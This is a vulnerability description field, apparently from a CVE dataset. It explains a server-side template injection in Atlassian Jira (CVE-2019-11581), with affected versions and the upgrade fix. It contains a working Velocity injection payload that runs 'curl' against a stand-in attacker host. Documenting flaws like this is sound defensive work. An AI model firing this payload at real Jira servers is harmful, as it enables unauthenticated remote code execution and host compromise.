    "desc": "CVE\u20112019\u201111581 is a server\u2011side template injection vulnerability in Atlassian Jira Server and Data Center. The vulnerability resides in the Contact Administrators and Send Bulk Mail web forms. User\u2011controlled input sent to the subject (or similar) fields is passed directly to the Velocity template engine without proper sanitisation. An attacker can embed a Velocity expression such as $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://attacker:8000/') which is evaluated by the server and leads to arbitrary Java code execution on the Jira host. The vulnerability is reachable without authentication via the public Contact Administrators form, and with administrator privileges via the Send Bulk Mail form. Successful exploitation results in full remote code execution on the underlying operating system, allowing the attacker to download and execute arbitrary files, open reverse shells, or otherwise compromise the host. Affected Jira releases include all versions prior to the fixed releases 7.6.14, 7.13.5, 8.0.3, 8.1.2 and 8.2.3 across the 4.4.x, 5.x, 6.x, 7.x and early 8.x lines. Mitigation requires upgrading Jira to one of the fixed versions or applying Atlassian\u2019s patch that sanitises template input.",
